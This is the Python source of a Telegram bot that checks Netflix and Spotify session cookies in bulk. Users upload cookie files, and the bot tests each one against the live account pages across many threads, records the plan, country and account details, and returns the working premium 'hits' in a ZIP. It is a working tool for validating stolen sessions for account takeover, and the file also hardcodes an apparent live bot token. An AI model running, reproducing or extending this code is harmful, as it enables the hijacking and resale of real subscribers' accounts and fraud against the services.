import os
import re
import json
import logging
import requests
import io
import zipfile
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
import asyncio

TOKEN = "7953822748:AAFFRqCi9OXwBUpA3Mw3MRbzEYAb_6YMTu8"
ADMIN_CHANNEL = -1002558074652
executor = ThreadPoolExecutor(max_workers=100)
logging.basicConfig(level=logging.INFO)
user_state = {}

START_MSG = (
    "<code>\n"
    " █ MASS COOKIE CHECKER █\n\n"
    "[ Step 1 ] Choose a mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file with cookies\n"
    "[ Step 3 ] Press \"Start Checking\"\n"
    "[ Step 4 ] Get results: All hits in ZIP at the end\n"
    "</code>"
    "<a href=\"https://t.me/S4J4G\">‎ </a>"
)
MODE_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("Spotify", callback_data="mode_spotify"),
     InlineKeyboardButton("Netflix", callback_data="mode_netflix")]
])

def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def parse_cookie_file(text):
    text = text.strip()
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                return [obj]
            elif isinstance(obj, list):
                out = []
                for cookie in obj:
                    if isinstance(cookie, dict):
                        if 'name' in cookie and 'value' in cookie:
                            out.append({cookie['name']: cookie['value']})
                        else:
                            out.append(cookie)
                if out:
                    return out
    except Exception:
        pass
    temp_cookie = {}
    blocks = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if line.startswith("NetflixId="):
            blocks.append({"NetflixId": line.split("=", 1)[1]})
            continue
        parts = re.split(r'\s+|\t+', line)
        if len(parts) >= 7:
            temp_cookie[parts[5]] = parts[6]
            continue
        kv = re.match(r'^([a-zA-Z0-9_\-\.\@]+)\s*=\s*(.+)$', line)
        if kv:
            k, v = kv.group(1), kv.group(2)
            temp_cookie[k] = v
            if ("NetflixId" in temp_cookie and "SecureNetflixId" in temp_cookie) or ("sp_dc" in temp_cookie):
                blocks.append(temp_cookie.copy())
                temp_cookie = {}
            elif "Spotify" in k or "Netflix" in k:
                blocks.append({k: v})
                temp_cookie = {}
            continue
        kv2 = re.match(r'^([a-zA-Z0-9_\-\.\@]+)\s*:\s*(.+)$', line)
        if kv2:
            k, v = kv2.group(1), kv2.group(2)
            temp_cookie[k] = v
            if ("NetflixId" in temp_cookie and "SecureNetflixId" in temp_cookie) or ("sp_dc" in temp_cookie):
                blocks.append(temp_cookie.copy())
                temp_cookie = {}
            elif "Spotify" in k or "Netflix" in k:
                blocks.append({k: v})
                temp_cookie = {}
            continue
        if ';' in line and '=' in line:
            for c in line.split(';'):
                c = c.strip()
                if '=' in c:
                    k, v = c.split('=', 1)
                    temp_cookie[k.strip()] = v.strip()
            if ("NetflixId" in temp_cookie and "SecureNetflixId" in temp_cookie) or ("sp_dc" in temp_cookie):
                blocks.append(temp_cookie.copy())
                temp_cookie = {}
            continue
    if temp_cookie:
        blocks.append(temp_cookie.copy())
    if not blocks:
        for line in text.splitlines():
            kv = re.match(r'^([a-zA-Z0-9_\-\.\@]+)\s*=\s*(.+)$', line)
            if kv:
                blocks.append({kv.group(1): kv.group(2)})
    return blocks if blocks else []

async def extract_cookies_from_zip(zip_path):
    import zipfile
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, cc in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        continue
    return cookies

async def extract_cookies_from_file(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        text = f.read()
        cookies = []
        c = parse_cookie_file(text)
        for idx, cc in enumerate(c):
            cookies.append((f"{os.path.basename(file_path)}_{idx}", cc))
        return cookies

def is_netflix_cookie(cookie_dict):
    return ("SecureNetflixId" in cookie_dict and "NetflixId" in cookie_dict) or ("NetflixId" in cookie_dict)
def is_spotify_cookie(cookie_dict):
    return "sp_dc" in cookie_dict or "sp_key" in cookie_dict

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'}
    try:
        resp = session.get(url, headers=headers, timeout=60)  # <-- timeout set here too
        txt = resp.text

        status = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status and status.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status)

        if not is_valid and "NetflixId" in cookie_dict and "SecureNetflixId" not in cookie_dict:
            is_valid = "Account & Billing" in txt or 'membershipStatus' in txt
            is_premium = is_valid

        country = "Unknown"
        match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', txt)
        if not match:
            match = re.search(r'"countryCode"\s*:\s*"([^"]+)"', txt)
        if match:
            country = match.group(1)

        plan = "Unknown"
        match = re.search(r'localizedPlanName.{1,30}?value":"([^"]+)"', txt)
        if not match:
            match = re.search(r'"planName"\s*:\s*"([^"]+)"', txt)
        if match:
            plan = match.group(1)
        elif "Premium" in txt:
            plan = "Premium"
        elif "Standard" in txt:
            plan = "Standard"
        elif "Basic" in txt:
            plan = "Basic"

        email_verified = bool(re.search(r'"emailVerified"\s*:\s*true', txt))
        extra = re.search(r'"showExtraMemberSection".+?value":(true|false)', txt)
        guid = re.search(r'"userGuid":\s*"([^"]+)"', txt)

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'guid': guid.group(1) if guid else "",
            'extra': extra.group(1).capitalize() if extra else "Unknown",
            'email_verified': email_verified,
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def check_spotify_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "application/json",
        }
        resp = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", headers=headers, timeout=60)
        if resp.status_code != 200:
            return {"ok": False, "reason": "Not logged in or invalid cookie", "cookie": cookie_dict}
        data = resp.json()
        plan = data.get("currentPlan", "unknown")
        is_premium = plan.lower() != "free"
        country = data.get("country", "unknown")
        is_recurring = data.get("isRecurring", False)
        is_trial = data.get("isTrialUser", False)
        return {
            "ok": is_premium,
            "premium": is_premium,
            "plan": plan,
            "country": country,
            "recurring": is_recurring,
            "trial": is_trial,
            "cookie": cookie_dict,
            "reason": None if is_premium else "Free plan"
        }
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await update.message.reply_html(
            "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
    await update.message.reply_html(START_MSG, reply_markup=MODE_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await query.answer()
        await context.bot.send_message(
            chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    mode = "spotify" if "spotify" in query.data else "netflix"
    user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
    await query.answer(f"Selected {mode.capitalize()} mode!")
    await context.bot.send_message(
        chat_id, f"<b>{mode.capitalize()} mode activated!</b>\nNow please upload your .txt/.json/.zip cookie file.",
        parse_mode='HTML'
    )

async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await query.answer()
        await context.bot.send_message(
            chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    new_mode = "spotify" if "spotify" in query.data else "netflix"
    user_state[user_id]['mode'] = new_mode
    user_state[user_id]['cookies'] = []
    await query.answer(f"Switched to {new_mode.capitalize()} mode!")
    await context.bot.send_message(
        chat_id, f"<b>Switched to {new_mode.capitalize()} mode!</b>\nNow please upload your .txt/.json/.zip cookie file.",
        parse_mode='HTML'
    )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if user_id in user_state:
        user_state[user_id]['stop'] = True
        await query.answer("Stopping...")
    else:
        await query.answer("Nothing to stop.")

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_state.get(user_id, {}).get('busy'):
        await query.answer("A check is already running.")
        return
    cookies = user_state.get(user_id, {}).get('cookies')
    if not cookies:
        await query.answer("No cookies loaded.")
        return
    user_state[user_id]['stop'] = False
    user_state[user_id]['busy'] = True
    await query.answer("Started checking!")
    context.application.create_task(process_cookies(chat_id, cookies, user_id, context))

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await update.message.reply_html(
            "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    if user_state.get(user_id, {}).get('mode') not in ['netflix', 'spotify']:
        await update.message.reply_html("Please select a mode first:", reply_markup=MODE_MARKUP)
        return
    mode = user_state[user_id]['mode']
    file = await update.message.document.get_file()
    ext = update.message.document.file_name.lower()
    import tempfile
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = os.path.join(temp_dir, update.message.document.file_name)
        await file.download_to_drive(temp_path)
        if ext.endswith('.zip'):
            cookies = await extract_cookies_from_zip(temp_path)
        elif ext.endswith('.txt') or ext.endswith('.json'):
            cookies = await extract_cookies_from_file(temp_path)
        else:
            await update.message.reply_text("Unsupported file type.")
            return
    good_cookies = []
    for name, ck in cookies:
        if (mode == "netflix" and is_netflix_cookie(ck)) or (mode == "spotify" and is_spotify_cookie(ck)):
            good_cookies.append((name, ck))
    if not good_cookies:
        await update.message.reply_text("No valid cookies found for this mode.")
        return
    user_state[user_id]['cookies'] = good_cookies
    check_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Start Checking", callback_data="start_check")]
    ])
    await update.message.reply_html(
        f"Loaded {len(good_cookies)} cookie set(s) from <code>{update.message.document.file_name}</code>. Press below to start.",
        reply_markup=check_markup
    )

async def process_cookies(chat_id, cookies, user_id, context):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    dot_length = 12
    UPDATE_EVERY = 1  # update progress each cookie
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop", callback_data="stop_check")]
    ])
    mode = user_state[user_id]['mode']
    progress_msg = (
        f"<b>{mode.capitalize()} Cookie Checking</b>\n"
        f"<code>{'○'*dot_length}</code>  0/{total}\n"
        f"Hits: <b>0</b> | Free: <b>0</b> | Fails: <b>0</b>"
    )
    msg = await context.bot.send_message(chat_id, progress_msg, parse_mode='HTML', reply_markup=reply_markup)
    msg_id = msg.message_id
    preview_msg = await context.bot.send_message(chat_id, "<b>Preview of hits will appear here...</b>", parse_mode='HTML')
    preview_msg_id = preview_msg.message_id

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for idx, (name, cookie) in enumerate(cookies):
            if user_state.get(user_id, {}).get('stop'):
                break

            try:
                if mode == 'spotify':
                    result = await asyncio.wait_for(
                        asyncio.get_running_loop().run_in_executor(executor, check_spotify_cookie, cookie),
                        timeout=60
                    )
                else:
                    result = await asyncio.wait_for(
                        asyncio.get_running_loop().run_in_executor(executor, check_netflix_cookie, cookie),
                        timeout=60
                    )
            except asyncio.TimeoutError:
                result = {'ok': False, 'err': 'Timeout', 'cookie': cookie}

            checked += 1
            if result['ok'] and result.get('premium', False):
                hits += 1
                status = "HIT (PREMIUM)"

                # Build file content: each key=value on its own line
                if mode == 'spotify':
                    plan = result.get('plan', 'Unknown')
                    recurring = result.get('recurring', False)
                    trial = result.get('trial', False)
                    country = result.get('country', 'Unknown')
                    cookie_lines = [f"{k}={v}" for k, v in result['cookie'].items()]
                    file_content = (
                        f"Status: {status}\n"
                        f"Plan: {plan}\n"
                        f"Recurring: {recurring}\n"
                        f"Trial User: {trial}\n"
                        f"Country: {country}\n\n"
                        f"Cookie ↓\n"
                        + "\n".join(cookie_lines)
                    )
                    preview_content = file_content.split("Cookie ↓")[0].strip()
                else:
                    plan = result.get('plan', 'Unknown')
                    email_verified = result.get('email_verified', False)
                    country = result.get('country', 'Unknown')
                    extra = result.get('extra', 'Unknown')
                    cookie_lines = [f"{k}={v}" for k, v in result['cookie'].items()]
                    file_content = (
                        f"Status: {status}\n"
                        f"Payment Method: {plan}\n"
                        f"Email Verified: {str(email_verified)}\n"
                        f"Country: {country}\n"
                        f"Extra member: {extra}\n\n"
                        f"Cookie ↓\n"
                        + "\n".join(cookie_lines)
                    )
                    preview_content = file_content.split("Cookie ↓")[0].strip()

                txt_filename = f"Live Cookie @S4J4G {hits}.txt" if hits > 1 else "Live Cookie @S4J4G.txt"
                zipf.writestr(txt_filename, file_content)
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=preview_msg_id,
                    text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
                )
            elif result['ok']:
                free += 1
            else:
                fails += 1

            # Update progress every cookie
            dots_done = checked * dot_length // total
            dots_left = dot_length - dots_done
            dot_bar = '●' * dots_done + '○' * dots_left
            progress_msg = (
                f"<b>{mode.capitalize()} Cookie Checking</b>\n"
                f"<code>{dot_bar}</code>  {checked}/{total}\n"
                f"Hits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
            )
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=progress_msg,
                parse_mode='HTML', reply_markup=reply_markup
            )

    zip_buffer.seek(0)
    if hits:
        await context.bot.send_document(
            chat_id,
            document=InputFile(zip_buffer, filename="Le re lund Ke Teri Cookies.zip"),
            caption=f"✅ Done!\nChecked: {checked}\nHits: {hits} | Free: {free} | Fails: {fails}\nAll hits in ZIP."
        )
    else:
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: 0 | Free: {free} | Fails: {fails}\n<b>No premium hits found.</b>",
            parse_mode='HTML'
        )

    user_state[user_id]['busy'] = False

    try:
        await context.bot.send_message(
            ADMIN_CHANNEL,
            f"User <a href='tg://user?id={user_id}'>{user_id}</a> checked {checked} cookies in {mode} mode.\nHits: {hits} | Free: {free} | Fails: {fails}",
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Admin log error: {e}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(spotify|netflix)$"))
    app.add_handler(CallbackQueryHandler(switchmode, pattern="^switchmode_(spotify|netflix)$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    app.run_polling()
